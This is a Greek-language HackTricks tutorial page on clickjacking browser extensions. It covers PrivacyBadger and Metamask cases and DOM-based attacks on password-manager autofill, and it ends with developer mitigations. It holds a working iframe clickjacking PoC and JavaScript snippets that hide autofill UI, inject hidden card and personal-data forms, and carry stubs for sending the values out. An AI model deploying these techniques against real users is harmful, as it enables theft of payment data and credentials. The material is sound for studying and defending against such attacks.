# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Αυτή η σελίδα θα εκμεταλλευτεί μια ευπάθεια ClickJacking σε μια επέκταση προγράμματος περιήγησης.\  
Αν δεν ξέρετε τι είναι το ClickJacking, δείτε:


{{#ref}}
../clickjacking.md
{{#endref}}

Οι επεκτάσεις περιέχουν το αρχείο **`manifest.json`** και αυτό το αρχείο JSON έχει το πεδίο `web_accessible_resources`. Αυτό λένε τα [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) σχετικά με αυτό:

> Αυτοί οι πόροι θα είναι τότε διαθέσιμοι σε μια ιστοσελίδα μέσω του URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, το οποίο μπορεί να δημιουργηθεί με την **`extension.getURL method`**. Οι allowlisted πόροι εξυπηρετούνται με τα κατάλληλα CORS headers, οπότε είναι διαθέσιμοι μέσω μηχανισμών όπως XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Τα **`web_accessible_resources`** σε μια επέκταση δεν είναι απλώς προσβάσιμα μέσω του web· λειτουργούν επίσης με τα εγγενή προνόμια της επέκτασης. Αυτό σημαίνει ότι έχουν τη δυνατότητα να:

- Αλλάξουν την κατάσταση της επέκτασης
- Φορτώσουν επιπλέον πόρους
- Αλληλεπιδράσουν με το πρόγραμμα περιήγησης σε κάποιο βαθμό

Ωστόσο, αυτή η δυνατότητα παρουσιάζει κίνδυνο ασφάλειας. Αν ένας πόρος μέσα στα **`web_accessible_resources`** έχει οποιαδήποτε σημαντική λειτουργικότητα, ένας attacker θα μπορούσε ενδεχομένως να ενσωματώσει αυτόν τον πόρο σε μια εξωτερική ιστοσελίδα. Χρήστες που επισκέπτονται χωρίς υπόνοια αυτή τη σελίδα μπορεί να ενεργοποιήσουν ακούσια αυτόν τον ενσωματωμένο πόρο. Μια τέτοια ενεργοποίηση θα μπορούσε να οδηγήσει σε ανεπιθύμητες συνέπειες, ανάλογα με τα permissions και τις δυνατότητες των πόρων της επέκτασης.

## PrivacyBadger Παράδειγμα

Στην επέκταση PrivacyBadger, εντοπίστηκε μια ευπάθεια σχετικά με τον κατάλογο `skin/` που δηλώθηκε ως `web_accessible_resources` με τον ακόλουθο τρόπο (Check the original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Αυτή η διαμόρφωση οδήγησε σε πιθανό ζήτημα ασφάλειας. Συγκεκριμένα, το αρχείο `skin/popup.html`, το οποίο εμφανίζεται όταν γίνεται αλληλεπίδραση με το εικονίδιο PrivacyBadger στο πρόγραμμα περιήγησης, μπορούσε να ενσωματωθεί μέσα σε ένα `iframe`. Αυτή η ενσωμάτωση μπορούσε να εκμεταλλευτεί για να παραπλανήσει τους χρήστες ώστε να πατήσουν ακούσια το "Disable PrivacyBadger for this Website". Μια τέτοια ενέργεια θα υπονόμευε το απόρρητο του χρήστη απενεργοποιώντας την προστασία της PrivacyBadger και ενδεχομένως εκθέτοντας τον χρήστη σε αυξημένη παρακολούθηση. Μια οπτική επίδειξη αυτού του exploit μπορεί να προβληθεί σε ένα παράδειγμα βίντεο ClickJacking που παρέχεται στο [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Για να αντιμετωπιστεί αυτή η ευπάθεια, εφαρμόστηκε μια απλή λύση: η αφαίρεση του `/skin/*` από τη λίστα των `web_accessible_resources`. Αυτή η αλλαγή μείωσε αποτελεσματικά τον κίνδυνο εξασφαλίζοντας ότι το περιεχόμενο του καταλόγου `skin/` δεν μπορούσε να προσπελαστεί ή να χειραγωγηθεί μέσω web-accessible resources.

Η διόρθωση ήταν απλή: **remove `/skin/*` from the `web_accessible_resources`.**

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Παράδειγμα Metamask

Ένα [**άρθρο για ένα ClickJacking στο Metamask βρίσκεται εδώ**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Σε αυτή την περίπτωση, η Metamask διόρθωσε την ευπάθεια ελέγχοντας ότι το πρωτόκολλο που χρησιμοποιήθηκε για την πρόσβαση ήταν **`https:`** ή **`http:`** (όχι **`chrome:`** για παράδειγμα):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Άλλο ClickJacking που διορθώθηκε** στην επέκταση Metamask ήταν ότι οι χρήστες μπορούσαν να **κάνουν κλικ για προσθήκη στη whitelist** όταν μια σελίδα ήταν ύποπτη για phishing λόγω `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Επειδή αυτή η σελίδα ήταν ευάλωτη σε Clickjacking, ένας επιτιθέμενος μπορούσε να την εκμεταλλευτεί δείχνοντας κάτι συνηθισμένο για να κάνει το θύμα να κάνει κλικ για να την whitelist χωρίς να το προσέξει, και μετά να επιστρέψει στη σελίδα phishing που θα βρίσκεται πλέον στη whitelist.

## Παράδειγμα Steam Inventory Helper

Δείτε την παρακάτω σελίδα για να δείτε πώς ένα **XSS** σε μια επέκταση προγράμματος περιήγησης συνδυάστηκε με μια ευπάθεια **ClickJacking**:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (UI αυτόματης συμπλήρωσης διαχειριστών κωδικών)

Τα κλασικά extension clickjacking εκμεταλλεύονται λανθασμένα διαμορφωμένα `web_accessible_resources` για να iframe privileged HTML και να χειραγωγήσουν τα κλικ των χρηστών. Μια νεότερη κατηγορία, DOM-based extension clickjacking, στοχεύει τα autofill dropdowns που εισάγουν οι password managers απευθείας στο DOM της σελίδας και χρησιμοποιεί κόλπα CSS/DOM για να τα κρύψει ή να τα καλύψει ενώ τα διατηρεί επιλέξιμα με κλικ. Ένα εξαναγκασμένο κλικ μπορεί να επιλέξει ένα αποθηκευμένο στοιχείο και να συμπληρώσει πεδία ελεγχόμενα από τον επιτιθέμενο με ευαίσθητα δεδομένα.

### Μοντέλο απειλής

- Ο επιτιθέμενος ελέγχει μια ιστοσελίδα (ή αποκτά XSS/υποκατάληψη υποτομέα/cache poisoning σε σχετικό domain).
- Το θύμα έχει εγκατεστημένη και ξεκλείδωτη επέκταση password manager (κάποιο autofill ακόμα και όταν είναι ονομαστικά κλειδωμένη).
- Προκαλείται τουλάχιστον ένα κλικ χρήστη (επικαλυπτόμενες μπάρες cookies, διαλόγοι, CAPTCHAs, παιχνίδια, κ.λπ.).

### Ροή επίθεσης (χειροκίνητο autofill)

1. Εισάγετε μια αόρατη αλλά εστιαζόμενη φόρμα (login/PII/credit-card πεδία).
2. Εστιάστε ένα input για να εμφανιστεί το autofill dropdown της επέκτασης κοντά στο πεδίο.
3. Κρύψτε ή καλύψτε το UI της επέκτασης ενώ το διατηρείτε διαδραστικό.
4. Στοιχίστε έναν πειστικό έλεγχο κάτω από το κρυφό dropdown για να εξαναγκάσετε ένα κλικ που επιλέγει ένα στοιχείο.
5. Διαβάστε τις συμπληρωμένες τιμές από τη φόρμα του επιτιθέμενου και εξάγετε τα δεδομένα.

### Πώς να κρύψετε το autofill UI

- Στοιχείο επέκτασης
- Αδιαφάνεια του root στοιχείου (γενικό):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- Παιδί μέσα σε open ShadowRoot (δυναμική ετικέτα, απόκρυψη εσωτερικού iframe):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Γονικό στοιχείο
- BODY/HTML κόλπα αδιαφάνειας για να κάνουν το extension UI αόραστο ενώ η σελίδα φαίνεται φυσιολογική (π.χ., φόντο screenshot):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Επικάλυψη
- Μερική επικάλυψη: αποκρύψτε τα πάντα εκτός από μερικά pixels ώστε το dropdown να παραμένει clickable (βεβαιωθείτε ότι η επικάλυψη του επιτιθέμενου είναι τελευταία στο DOM με max z-index, ή χρησιμοποιήστε Top Layer).
- Πλήρης επικάλυψη χρησιμοποιώντας pointer-events:none ώστε τα clicks να περνούν στο κρυφό dropdown· διατηρήστε την μόνιμη με το Popover API:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Τοποθέτηση του κλικ του θύματος

- Σταθερή τοποθέτηση: τοποθετήστε το κρυφό dropdown κάτω από ένα πειστικό στοιχείο ελέγχου όπως “Αποδοχή cookies”, “Κλείσιμο”, ή το checkbox του CAPTCHA.
- Ακολούθηση του ποντικιού: μετακινήστε το εστιασμένο input κάτω από τον δείκτη ώστε το dropdown να το ακολουθεί; επανεστίαση περιοδικά ώστε ένα μόνο κλικ οπουδήποτε να επιλέγει ένα στοιχείο:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Επιπτώσεις και σενάρια

- Attacker-controlled site: ένα εξαναγκασμένο κλικ μπορεί να εξάγει δεδομένα πιστωτικής κάρτας (number/expiry/CVC) και προσωπικά στοιχεία (name, email, phone, address, DOB) που δεν είναι domain-scoped.
- Trusted site with XSS/subdomain takeover/cache poisoning: κλοπή διαπιστευτηρίων με πολλαπλά κλικ (username/password) και TOTP, επειδή πολλοί managers κάνουν autofill σε σχετικά subdomains/parent domains (π.χ. `*.example.com`).
- Passkeys: εάν το RP δεν δέσμευει τις WebAuthn προκλήσεις στη συνεδρία, το XSS μπορεί να υποκλέψει την υπογεγραμμένη assertion· DOM-based clickjacking κρύβει το passkey prompt για να εξαναγκάσει το επιβεβαιωτικό κλικ του χρήστη.

### Περιορισμοί

- Απαιτεί τουλάχιστον ένα κλικ χρήστη και καλή ευθυγράμμιση pixels (ρεαλιστικά overlays κάνουν εύκολη την προτροπή για κλικ).
- Auto-lock/logout μειώνει τα παράθυρα εκμετάλλευσης· κάποιοι managers εξακολουθούν να κάνουν autofill ενώ είναι “locked”.

### Μέτρα μετριασμού για προγραμματιστές επεκτάσεων

- Αποδώστε το autofill UI στο Top Layer (Popover API) ή με άλλο τρόπο διασφαλίστε ότι βρίσκεται πάνω από το page stacking· αποφύγετε να καλύπτεται από page-controlled overlays.
- Αντισταθείτε σε παραποίησης CSS: προτιμήστε Closed Shadow DOM και παρακολουθείστε με `MutationObserver` για ύποπτες αλλαγές στυλ στις ρίζες του UI.
- Εντοπίστε εχθρικά overlays πριν το γέμισμα: απαριθμήστε άλλα top-layer/popover στοιχεία, απενεργοποιήστε προσωρινά `pointer-events:none` και χρησιμοποιήστε `elementsFromPoint()` για να εντοπίσετε αποκλεισμό· κλείστε το UI αν υπάρχουν overlays.
- Εντοπίστε ύποπτες αλλαγές opacity ή στυλ στα `<body>`/`<html>` τόσο πριν όσο και μετά το render.
- Για θέματα με iframe: περιορίστε τα MV3 `web_accessible_resources` `matches` στενά και αποφύγετε την έκθεση HTML UIs· για αναπόφευκτο HTML, στείλτε `X-Frame-Options: DENY` ή `Content-Security-Policy: frame-ancestors 'none'`.

## Αναφορές

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
